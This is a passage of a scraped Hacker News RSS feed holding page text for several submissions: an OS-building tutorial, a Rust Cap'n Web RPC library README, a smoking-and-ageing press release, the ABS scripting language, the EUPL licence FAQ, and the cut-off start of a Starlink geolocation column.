&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45420001</guid><pubDate>Mon, 29 Sep 2025 23:12:36 +0000</pubDate></item><item><title>How to create an OS from scratch</title><link>https://github.com/cfenollosa/os-tutorial</link><description>&lt;doc fingerprint="24681a5247a60bd0"&gt;
  &lt;main&gt;
    &lt;p&gt;How to create an OS from scratch!&lt;/p&gt;
    &lt;p&gt;I have always wanted to learn how to make an OS from scratch. In college I was taught how to implement advanced features (pagination, semaphores, memory management, etc) but:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;I never got to start from my own boot sector&lt;/item&gt;
      &lt;item&gt;College is hard so I don't remember most of it.&lt;/item&gt;
      &lt;item&gt;I'm fed up with people who think that reading an already existing kernel, even if small, is a good idea to learn operating systems.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Inspired by this document and the OSDev wiki, I'll try to make short step-by-step READMEs and code samples for anybody to follow. Honestly, this tutorial is basically the first document but split into smaller pieces and without the theory.&lt;/p&gt;
    &lt;p&gt;Updated: more sources: the little book about OS development, JamesM's kernel development tutorials&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;This course is a code tutorial aimed at people who are comfortable with low level computing. For example, programmers who have curiosity on how an OS works but don't have the time or willpower to start reading the Linux kernel top to bottom.&lt;/item&gt;
      &lt;item&gt;There is little theory. Yes, this is a feature. Google is your theory lecturer. Once you pass college, excessive theory is worse than no theory because it makes things seem more difficult than they really are.&lt;/item&gt;
      &lt;item&gt;The lessons are tiny and may take 5-15 minutes to complete. Trust me and trust yourself. You can do it!&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;p&gt;Start with the first folder and go down in order. They build on previous code, so if you jump right to folder 05 and don't know why there is a&lt;/p&gt;&lt;code&gt;mov ah, 0x0e&lt;/code&gt;, it's because you missed lecture 02. Really, just go in order. You can always skip stuff you already know.&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Open the README and read the first line, which details the concepts you should be familiar with before reading the code. Google concepts you are not familiar with. The second line states the goals for each lesson. Read them, because they explain why we do what we do. The "why" is as important as the "how".&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Read the rest of the README. It is very concise.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;(Optional) Try to write the code files by yourself after reading the README.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Look at the code examples. They are extremely well commented.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;(Optional) Experiment with them and try to break things. The only way to make sure you understood something is trying to break it or replicate it with different commands.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;TL;DR: First read the README on each folder, then the code files. If you're brave, try to code them yourself.&lt;/p&gt;
    &lt;p&gt;We will want to do many things with our OS:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Boot from scratch, without GRUB - DONE!&lt;/item&gt;
      &lt;item&gt;Enter 32-bit mode - DONE&lt;/item&gt;
      &lt;item&gt;Jump from Assembly to C - DONE!&lt;/item&gt;
      &lt;item&gt;Interrupt handling - DONE!&lt;/item&gt;
      &lt;item&gt;Screen output and keyboard input - DONE!&lt;/item&gt;
      &lt;item&gt;A tiny, basic &lt;code&gt;libc&lt;/code&gt;which grows to suit our needs - DONE!&lt;/item&gt;
      &lt;item&gt;Memory management&lt;/item&gt;
      &lt;item&gt;Write a filesystem to store files&lt;/item&gt;
      &lt;item&gt;Create a very simple shell&lt;/item&gt;
      &lt;item&gt;User mode&lt;/item&gt;
      &lt;item&gt;Maybe we will write a simple text editor&lt;/item&gt;
      &lt;item&gt;Multiple processes and scheduling&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Probably we will go through them in that order, however it's soon to tell.&lt;/p&gt;
    &lt;p&gt;If we feel brave enough:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;A BASIC interpreter, like in the 70s!&lt;/item&gt;
      &lt;item&gt;A GUI&lt;/item&gt;
      &lt;item&gt;Networking&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This is a personal learning project, and even though it hasn't been updated for a long time, I still have hopes to get into it at some point.&lt;/p&gt;
    &lt;p&gt;I'm thankful to all those who have pointed out bugs and submitted pull requests. I will need some time to review everything and I cannot guarantee that at this moment.&lt;/p&gt;
    &lt;p&gt;Please feel free to fork this repo. If many of you are interested in continuing the project, let me know and I'll link the "main fork" from here.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45420173</guid><pubDate>Mon, 29 Sep 2025 23:32:10 +0000</pubDate></item><item><title>Awakening Bell</title><link>https://awakeningbell.org/</link><description>&lt;doc fingerprint="63b99361f52b7ee2"&gt;
  &lt;main&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell&gt;Welcome to the online Awakening Bell, inspired by the teaching of Thich Nhat Hanh. Many people around the world take pleasure in stopping and consciously breathing in and out three times when they hear the sound of the bell. Click below for examples of the sound made by the big and the small bell. Either can be used by inputing a time interval, an exact time, or a random interval. Enjoy, and please email feedback and suggestions to awakeningbelldotorg at gmail.com. ☺&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Big Bell&lt;/cell&gt;
        &lt;cell&gt;Small Bell&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;I would like a small bell to ring every&lt;/cell&gt;
        &lt;cell&gt;minutes.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;I would like a big bell to ring every&lt;/cell&gt;
        &lt;cell&gt;minutes.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Waiting for input&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;I would like a bell to ring - randomly - between&lt;/cell&gt;
        &lt;cell&gt;and minutes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Waiting for input&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row/&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell&gt;I would like a bell ringing hourly on the hour.&lt;/cell&gt;
        &lt;cell&gt;Waiting for input&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45421067</guid><pubDate>Tue, 30 Sep 2025 01:46:02 +0000</pubDate></item><item><title>Show HN: Cap'n-rs – Rust implementation of Cloudflare's Cap'n Web protocol</title><link>https://github.com/currentspace/capn-rs</link><description>&lt;doc fingerprint="8211d59ab4314bc4"&gt;
  &lt;main&gt;
    &lt;p&gt;A complete, production-ready implementation of the Cap'n Web protocol in Rust, providing capability-based RPC with promise pipelining and multi-transport support.&lt;/p&gt;
    &lt;p&gt;✅ Full Protocol Compliance - Implements the complete Cap'n Web wire protocol 🔒 Capability-Based Security - Unforgeable capability references with automatic lifecycle management 🚀 Promise Pipelining - Reduced round-trips through dependency resolution 🌐 Multi-Transport - HTTP batch, WebSocket, and WebTransport support 🛡️ Production-Ready - Zero-panic code, comprehensive error handling with context ✅ IL Expression Evaluation - Complete intermediate language support with array notation 🌍 JavaScript Interop - Validated against official TypeScript implementation&lt;/p&gt;
    &lt;code&gt;[dependencies]
capnweb-server = "0.1.0"
capnweb-client = "0.1.0"&lt;/code&gt;
    &lt;code&gt;use capnweb_server::{Server, ServerConfig, RpcTarget};
use capnweb_core::{CapId, RpcError};
use serde_json::{json, Value};
use std::sync::Arc;

#[derive(Debug)]
struct Calculator;

impl RpcTarget for Calculator {
    async fn call(&amp;amp;self, member: &amp;amp;str, args: Vec&amp;lt;Value&amp;gt;) -&amp;gt; Result&amp;lt;Value, RpcError&amp;gt; {
        match member {
            "add" =&amp;gt; {
                let a = args[0].as_f64().unwrap();
                let b = args[1].as_f64().unwrap();
                Ok(json!(a + b))
            }
            _ =&amp;gt; Err(RpcError::not_found("method not found")),
        }
    }
}

#[tokio::main]
async fn main() -&amp;gt; Result&amp;lt;(), Box&amp;lt;dyn std::error::Error&amp;gt;&amp;gt; {
    let config = ServerConfig::default();
    let server = Server::new(config);

    // Register capabilities
    server.register_capability(CapId::new(1), Arc::new(Calculator));

    // Run server with HTTP batch endpoint
    server.run().await?;
    Ok(())
}&lt;/code&gt;
    &lt;code&gt;use capnweb_client::{Client, ClientConfig};
use capnweb_core::CapId;
use serde_json::json;

#[tokio::main]
async fn main() -&amp;gt; Result&amp;lt;(), Box&amp;lt;dyn std::error::Error&amp;gt;&amp;gt; {
    // Create client configuration
    let config = ClientConfig {
        url: "http://localhost:8080/rpc/batch".to_string(),
        ..Default::default()
    };
    let client = Client::new(config)?;

    // Make RPC calls
    let result = client.call(CapId::new(1), "add", vec![json!(10), json!(20)]).await?;
    println!("Result: {}", result);

    Ok(())
}&lt;/code&gt;
    &lt;p&gt;The implementation is organized into focused crates:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;capnweb-core&lt;/code&gt;- Core protocol implementation (messages, IL, validation)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;capnweb-transport&lt;/code&gt;- Transport layer implementations (HTTP, WebSocket, WebTransport)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;capnweb-server&lt;/code&gt;- Server implementation with capability management&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;capnweb-client&lt;/code&gt;- Client implementation with ergonomic recorder API&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;capnweb-interop-tests&lt;/code&gt;- JavaScript interoperability verification&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;use capnweb_client::{Client, ClientConfig};

let config = ClientConfig {
    url: "http://localhost:8080/rpc/batch".to_string(),
    ..Default::default()
};
let client = Client::new(config)?;&lt;/code&gt;
    &lt;code&gt;// WebSocket transport is implemented and available
// Usage requires creating a WebSocketTransport from an established WebSocket connection
use capnweb_transport::WebSocketTransport;
use tokio_tungstenite::connect_async;

let (ws_stream, _) = connect_async("ws://localhost:8080/ws").await?;
let transport = WebSocketTransport::new(ws_stream);&lt;/code&gt;
    &lt;code&gt;use capnweb_server::H3Server;

let mut h3_server = H3Server::new(server);
h3_server.listen("0.0.0.0:8443".parse()?).await?;&lt;/code&gt;
    &lt;code&gt;// Promise pipelining is handled internally by the protocol
// Multiple calls in a batch are automatically optimized
let batch = vec![
    Message::Call { /* ... */ },
    Message::Call { /* ... */ },
];
// The server processes these with dependency resolution&lt;/code&gt;
    &lt;code&gt;use serde_json::json;

// Build complex JSON structures for RPC calls
let request_data = json!({
    "users": [user1, user2, user3],
    "statistics": {
        "total_count": total,
        "active_count": active,
    },
    "metadata": {
        "generated_at": timestamp,
        "version": version_info,
    },
});&lt;/code&gt;
    &lt;code&gt;match client.call(cap_id, "method", args).await {
    Ok(result) =&amp;gt; println!("Success: {}", result),
    Err(e) =&amp;gt; {
        // RpcError contains code, message, and optional data
        println!("Error {}: {}", e.code, e.message);
        if let Some(data) = &amp;amp;e.data {
            println!("Additional data: {}", data);
        }
    }
}&lt;/code&gt;
    &lt;p&gt;Run the included examples to see the implementation in action:&lt;/p&gt;
    &lt;code&gt;# Run client examples
cargo run --example basic_client
cargo run --example calculator_client
cargo run --example error_handling
cargo run --example batch_pipelining

# Start the server (using bin/capnweb-server)
cargo run --bin capnweb-server&lt;/code&gt;
    &lt;p&gt;Run benchmarks to measure performance:&lt;/p&gt;
    &lt;code&gt;cargo bench --bench protocol_benchmarks&lt;/code&gt;
    &lt;p&gt;The implementation includes optimizations for:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Concurrent capability execution&lt;/item&gt;
      &lt;item&gt;Efficient promise dependency resolution&lt;/item&gt;
      &lt;item&gt;Connection pooling and reuse&lt;/item&gt;
      &lt;item&gt;Minimal memory allocations&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Comprehensive test suite with tests across all core modules:&lt;/p&gt;
    &lt;code&gt;# Run all tests
cargo test --workspace

# Run specific crate tests
cargo test -p capnweb-core
cargo test -p capnweb-server
cargo test -p capnweb-client

# Run with output for debugging
cargo test -- --nocapture&lt;/code&gt;
    &lt;p&gt;The Rust implementation is fully compatible with JavaScript Cap'n Web implementations:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;✅ Identical message formats and serialization&lt;/item&gt;
      &lt;item&gt;✅ Compatible IL plan structures&lt;/item&gt;
      &lt;item&gt;✅ Matching error handling patterns&lt;/item&gt;
      &lt;item&gt;✅ Shared protocol semantics&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Test interoperability:&lt;/p&gt;
    &lt;code&gt;cargo test --package capnweb-interop-tests&lt;/code&gt;
    &lt;code&gt;use capnweb_server::ServerConfig;

let config = ServerConfig {
    port: 8080,
    host: "0.0.0.0".to_string(),
    max_batch_size: 100,
};&lt;/code&gt;
    &lt;code&gt;use tracing::{info, warn, error};
use tracing_subscriber;

// Enable structured logging
tracing_subscriber::fmt()
    .with_max_level(tracing::Level::INFO)
    .json()
    .init();&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Use proper TLS certificates for WebTransport&lt;/item&gt;
      &lt;item&gt;Implement authentication for capability access&lt;/item&gt;
      &lt;item&gt;Configure appropriate rate limiting&lt;/item&gt;
      &lt;item&gt;Enable audit logging for capability calls&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Fork the repository&lt;/item&gt;
      &lt;item&gt;Create a feature branch&lt;/item&gt;
      &lt;item&gt;Add tests for new functionality&lt;/item&gt;
      &lt;item&gt;Ensure all tests pass: &lt;code&gt;cargo test&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Run benchmarks: &lt;code&gt;cargo bench&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Submit a pull request&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Zero panics - No &lt;code&gt;unwrap()&lt;/code&gt;in production code, all errors handled explicitly&lt;/item&gt;
      &lt;item&gt;All code must pass &lt;code&gt;cargo test&lt;/code&gt;and&lt;code&gt;cargo clippy&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Use latest crate versions unless compatibility requires older versions&lt;/item&gt;
      &lt;item&gt;Research errors before attempting fixes&lt;/item&gt;
      &lt;item&gt;Comprehensive documentation for all public APIs&lt;/item&gt;
      &lt;item&gt;See RUST_CODING_STANDARDS.md for complete guidelines&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This repository uses CodeRabbit for automated PR reviews. The bot will:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Check for compliance with our coding standards&lt;/item&gt;
      &lt;item&gt;Suggest improvements for error handling and performance&lt;/item&gt;
      &lt;item&gt;Verify protocol implementation correctness&lt;/item&gt;
      &lt;item&gt;Ensure no &lt;code&gt;unwrap()&lt;/code&gt;or&lt;code&gt;panic!&lt;/code&gt;in production code&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Configuration is in &lt;code&gt;.coderabbit.yaml&lt;/code&gt;. The bot's suggestions are educational but not mandatory - maintainers make final decisions.&lt;/p&gt;
    &lt;p&gt;Licensed under either of:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Apache License, Version 2.0 (LICENSE-APACHE or http://www.apache.org/licenses/LICENSE-2.0)&lt;/item&gt;
      &lt;item&gt;MIT License (LICENSE-MIT or http://opensource.org/licenses/MIT)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;at your option.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;API Documentation (GitHub Pages) - Full API documentation for all crates&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;capnweb-core - Core protocol types and messages&lt;/item&gt;
          &lt;item&gt;capnweb-transport - Transport implementations&lt;/item&gt;
          &lt;item&gt;capnweb-server - Server capabilities&lt;/item&gt;
          &lt;item&gt;capnweb-client - Client implementation&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;docs.rs - Published crate documentation:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;capnweb-core - Core protocol types&lt;/item&gt;
          &lt;item&gt;capnweb-transport - Transport layers&lt;/item&gt;
          &lt;item&gt;capnweb-server - Server implementation&lt;/item&gt;
          &lt;item&gt;capnweb-client - Client library&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Cap'n Web Protocol Specification - Technical specification&lt;/item&gt;
      &lt;item&gt;Development Guide - Implementation guide for contributors&lt;/item&gt;
      &lt;item&gt;Coding Standards - Rust coding standards and best practices&lt;/item&gt;
      &lt;item&gt;CodeRabbit Setup - Automated code review configuration&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;# Build documentation with all features
cargo doc --workspace --all-features --no-deps --open

# Build with private items documented
cargo doc --workspace --all-features --document-private-items --no-deps --open

# Check for documentation issues
cargo doc --workspace --all-features --no-deps 2&amp;gt;&amp;amp;1 | grep warning&lt;/code&gt;
    &lt;p&gt;All public APIs are documented. To check documentation coverage:&lt;/p&gt;
    &lt;code&gt;cargo rustdoc -p capnweb-core -- -Z unstable-options --show-coverage&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Certificate-based authentication&lt;/item&gt;
      &lt;item&gt;Capability attestation and verification&lt;/item&gt;
      &lt;item&gt;Message compression for large payloads&lt;/item&gt;
      &lt;item&gt;Streaming capabilities for real-time data&lt;/item&gt;
      &lt;item&gt;Protocol versioning and evolution&lt;/item&gt;
      &lt;item&gt;Performance optimizations and caching&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Built with ❤️ in Rust. Ready for production use.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45421221</guid><pubDate>Tue, 30 Sep 2025 02:13:00 +0000</pubDate></item><item><title>Show HN: Devbox – Containers for better dev environments</title><link>https://devbox.ar0.eu/</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45421302</guid><pubDate>Tue, 30 Sep 2025 02:26:39 +0000</pubDate></item><item><title>People may age faster if their dad smoked during puberty</title><link>https://www.ersnet.org/news-and-features/news/people-may-age-faster-if-their-dad-smoked-during-puberty/</link><description>&lt;doc fingerprint="bd5e8119a833a715"&gt;
  &lt;main&gt;
    &lt;p&gt;Monday 29 September, 2025 – Amsterdam, Netherlands:&lt;/p&gt;
    &lt;p&gt;People whose fathers smoked during puberty seem to age faster than expected, according to research presented at the European Respiratory Society (ERS) Congress in Amsterdam, the Netherlands [1].&lt;/p&gt;
    &lt;p&gt;The researchers found signs of faster biological ageing, compared to chronological age, in people whose fathers began smoking at age 15 or younger. They say smoking during puberty may create damage in boys’ developing sperm cells that can be passed on to their children.&lt;/p&gt;
    &lt;p&gt;The researchers call for stronger efforts to prevent tobacco use in teenagers, not only to benefit the current generation but also future generations.&lt;/p&gt;
    &lt;p&gt;The study was presented by Dr Juan Pablo López-Cervantes from the University of Bergen, Norway. He said: “Our research group has previously shown that smoking during puberty may harm not only the person who smokes, but also their future children. In this new study, we wanted to explore whether parental smoking in puberty may also influence the biological ageing of their future children.”&lt;/p&gt;
    &lt;p&gt;The researchers did this using a well-established measure of biological ageing known as epigenetic clocks. As we age, extra molecules accumulate on the DNA in our cells. This does not alter the DNA code, but it does influence how our genes behave. These so-called epigenetic changes are not only a sign of ageing, they are also linked to diseases of older age such as cancer and dementia.&lt;/p&gt;
    &lt;p&gt;The research included a group of 892 people, ranging in chronological age from 7 to 50 years and with an average age of 28, who were taking part in the RHINESSA study [2] and provided blood samples for testing. Their blood samples were analysed for epigenetic changes, then researchers applied three different scores of biological ageing. They were also asked a series of questions, including whether they or their parents had ever smoked and at what age.&lt;/p&gt;
    &lt;p&gt;The researchers found that people whose fathers began smoking during puberty were around nine months to a year older than their chronological age on average. When researchers took into account whether the people themselves had ever smoked, this gap between biological and chronological age was greater (14 to 15 months).&lt;/p&gt;
    &lt;p&gt;In people whose fathers began smoking later in life, researchers found only a small increase in biological age. They found no clear pattern in biological ageing in people whose mothers smoked before pregnancy.&lt;/p&gt;
    &lt;p&gt;Dr López-Cervantes said: “This accelerated biological ageing is important as it has been linked to a higher risk of diseases such as cancer, arthritis and dementia in previous research. Our results suggest that boys who smoke during puberty may be unknowingly creating harm for the children they go on to have.&lt;/p&gt;
    &lt;p&gt;“This research does not fully explain why smoking in puberty is linked to faster aging, but we think that when fathers start smoking during puberty, it may alter the epigenetic material of their sperm cells, and that these changes may be passed on to the next generation.&lt;/p&gt;
    &lt;p&gt;“Although this research is still in its early days, we believe our findings are important for young boys who smoke or consume other types of nicotine products. Stronger efforts to prevent tobacco use in adolescence should be a priority for policy makers. Such efforts could benefit not only the current generations but also those in the future.”&lt;/p&gt;
    &lt;p&gt;Dr Stamatoula Tsikrika is Chair of the European Respiratory Society’s expert group on tobacco, smoking control and health education, based at Sotiria Hospital in Athens, Greece, and was not involved in the research. She said: “We all know that smoking causes diseases such as asthma, COPD and cancer. What we’re starting to learn is that the damage caused by smoking can persist across generations. This study suggests that boys who start smoking at 15 or younger can pass the damage on to any children they have many years later.&lt;/p&gt;
    &lt;p&gt;“Although rates of smoking in teenagers seem to be declining, rates of vaping are generally increasing, and we don’t yet know the long-term impact of vaping on children and teenagers. This research is another reminder that we need to protect children and teenagers from nicotine addiction, smoking and vaping.”&lt;/p&gt;
    &lt;p&gt;[1] Abstract no: PA3770 “Father’s smoking initiation in puberty as associated with accelerated ageing in offspring”, by Juan Pablo Lopez Cervantes et al; Presented in session, “Enhancing lung health through effective tobacco cessation strategies” at 12:30-14:00 CEST on Monday 29 September 2025. [https://k4.ersnet.org/prod/v2/Front/Program/Session?e=685&amp;amp;session=19250]&lt;/p&gt;
    &lt;p&gt;[2] Respiratory Health in Northern Europe, Spain and Australia&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45422273</guid><pubDate>Tue, 30 Sep 2025 05:40:02 +0000</pubDate></item><item><title>The ABS Programming Language</title><link>https://www.abs-lang.org/</link><description>&lt;doc fingerprint="38779b7f9395b09c"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The ABS programming language&lt;/head&gt;
    &lt;p&gt;Bring back the joy of shell scripting.&lt;/p&gt;
    &lt;head rend="h2"&gt;A familiar syntax&lt;/head&gt;
    &lt;p&gt;ABS should look familiar to most of us, as its elements are borrowed from popular programming languages such as Ruby, Python or JavaScript:&lt;/p&gt;
    &lt;code&gt;obj = {} 
for n in 1..10 {     
  if n % 2 == 0 { 
    obj[n.str()] = rand(6**2) 
  } 
} 
echo("We have %s", obj)  
# We have {"10": 79, ...}&lt;/code&gt;
    &lt;head rend="h2"&gt;Scripting made easy&lt;/head&gt;
    &lt;p&gt;System commands are deeply integrated (and encouraged); they make ABS ideal to work with in the context of shell scripting:&lt;/p&gt;
    &lt;code&gt;ip = `curl icanhazip.com`

ip.ok // true
ip // 1.2.3.4

echo("type something...")
input = stdin()
echo("you typed %s",input)&lt;/code&gt;
    &lt;head rend="h2"&gt;Easy to run&lt;/head&gt;
    &lt;p&gt;Grab the latest release, run &lt;code&gt;abs your_script.abs&lt;/code&gt; and see the magic happening. ABS works on Mac, Windows and Linux:&lt;/p&gt;
    &lt;code&gt;$ abs test.abs 

1.2.3.4

type something...
Hello world!
you typed Hello world!
$&lt;/code&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45422353</guid><pubDate>Tue, 30 Sep 2025 05:53:25 +0000</pubDate></item><item><title>European Union Public Licence (EUPL)</title><link>https://eupl.eu/</link><description>&lt;doc fingerprint="c55bf052bbab059e"&gt;
  &lt;main&gt;
    &lt;p&gt;License 1.2: [BG] [CS] [DA] [DE] [EL] [EN] [ES] [ET] [FI] [FR] [HR] [HU] [IT] [LT] [LV] [MT] [NL] [PL] [PT] [RO] [SK] [SL] [SV].&lt;/p&gt;
    &lt;p&gt;EUPL is an acronym for "European Union Public Licence".&lt;/p&gt;
    &lt;p&gt;The first EUPL draft (v.0.1) went public in June 2005. A public debate was then organised by the European Commission (IDABC). The consultation of the developers and users community was very productive and has lead to many improvements of the draft licence; 10 out of 15 articles were modified. Based on the results of these modifications (a detailed report and the draft EUPL v.0.2), the European Commission elaborated a final version (v.1.0) that was officially approved on 9 January 2007, in three linguistic versions.&lt;/p&gt;
    &lt;p&gt;By a second Decision of 9 January 2008, the European Commission validated the EUPL in all the official languages of the European Union.&lt;/p&gt;
    &lt;p&gt;By a third Decision of 9 January 2009, the European Commission clarified specific points of the EUPL, publishing the version 1.1 in all the official languages of the European Union.&lt;/p&gt;
    &lt;p&gt;The Commission Implementing Decision (EU) 2017/863 of 18 May 2017 updating the open source software licence EUPL to further facilitate the sharing and reuse of software developed by public administrations (OJ 19/05/2017 L128 p. 59–64 ) published the version 1.2, with extended compatibility.&lt;/p&gt;
    &lt;p&gt;The purpose of the European Commission is first of all to distribute its own software under the licence. Some applications developed in the framework of the IDABC programme, such as Circabc, or Eusurvey have already been licensed under the EUPL in 2007. Other European Institutions are also interested in using the new licence.&lt;/p&gt;
    &lt;p&gt;But why creating a new legal instrument from scratch when more than 100 other F/OSS licences exist, such as the GPL, the BSD or the OSL? The reason is that in a detailed legal study no existing licence was found to correspond to the requirements of the European Commission:&lt;/p&gt;
    &lt;p&gt;The main objective of the European Commission is to distribute widely and promote the use of software owned by itself and other European Institutions under an Free/Open Source Licence conform to European law requirements.&lt;/p&gt;
    &lt;p&gt;The EUPL is however written in neutral terms so that a broader use might be envisaged.&lt;/p&gt;
    &lt;p&gt;In addition, distribution of software should avoid the exclusive appropriation of the software even after improvement by a third party (therefore, the EUPL is a "copyleft" licence).&lt;/p&gt;
    &lt;p&gt;Although the potential users of European Institutions' software are mostly other public sector administrations, there is nothing in the EUPL preventing its broader use. The EUPL could be used by anyone who holds the copyright to a piece of software. It could become – in various languages - an adequate legal interoperability instrument across Europe.&lt;/p&gt;
    &lt;p&gt;Nevertheless, the EUPL purpose is not to compete with other licences. It might be used primarily by public administrations, either European or national, that would need a common licensing instrument to mutualise or share software and knowledge.&lt;/p&gt;
    &lt;p&gt;Yes, it is. The EUPL contains a unique compatibility clause and provides for a list of compatible copyleft licences. The GPL is one of them.&lt;/p&gt;
    &lt;p&gt;For example, how would the interaction between the EUPL and the GPL play out in the case of CIRCA, an application a already distributed under the EUPL?&lt;/p&gt;
    &lt;p&gt;A developer may merge the Circabc software with a GPL component, and then could license the new derivative work (another project, with a new name) under the GPL. It is not permitted to "re-license" CIRCA under the GPL. A developer will be also able to integrate CIRCA in existing GPL work called e.g. "MY-GPL-PROGRAM" and continue to license this improved work under the GPL licence that he had chosen originally.&lt;/p&gt;
    &lt;p&gt;This website is not sponsored or endorsed by the European Commission or any other institution, body or agency of the European Union.&lt;/p&gt;
    &lt;p&gt;Created by Javier Casares (legal) under license EUPL 1.2.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45422512</guid><pubDate>Tue, 30 Sep 2025 06:23:05 +0000</pubDate></item><item><title>Geolocation and Starlink</title><link>https://www.potaroo.net/ispcol/2025-09/starlinkgeo.html</link><description>&lt;doc fingerprint="5d409b51bb6528cb"&gt;
  &lt;main&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;The ISP Column&lt;/p&gt;
          &lt;p&gt; A column on various things Internet&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row/&gt;
    &lt;/table&gt;
    &lt;p&gt; Geolocation and Starlink &lt;lb/&gt; September 2025 &lt;/p&gt;
    &lt;p&gt;"Where are you?" is not an easy question to answer on the Internet. The telephone system's address plan embedded a certain amount of physical location information in the fixed line network, and a full E.164 telephone number indicated your location in terms of your country, and your area within that country. The Internet did not adopt a geographic address plan which means that you're going to need a lot of additional information if you want to map an IP address into a location at the level of a country or a city.&lt;/p&gt;
    &lt;p&gt;Creating and maintaining such collections of geolocation data that maps IP addresses to a geolocation presents some challenges. Even a basic question, such as "How are you going to represent a location?" has a variety of answers. One could use latitude and longitude, but this has its own complications. What if you just wanted to map addresses into countries? You need a representation of a political map to translate these coordinates into a country. Or you could avoid these multiple layers of indirection and simply map IP addresses into countries. However, once you start referring to countries you run into a new set of questions, starting with the most basic ones of "What's a country?" and "What's a uniform way of naming them?" Thankfully these are not novel questions, and we can leverage the work of others to provide some answers here. These is the group that maintains the ISO 3166 standard, published by the International Organization for Standardisation that enumerates a list of codes of countries and dependant territories, using both 2 letter codes, three letter codes and three-digit numeric codes, all maintained by the imaginatively named "ISO 3166 Maintenance Agency," a group of 15 voting experts. There is also the United Nations Statistics Division, a body that maintains a number of related lists, including the "official" 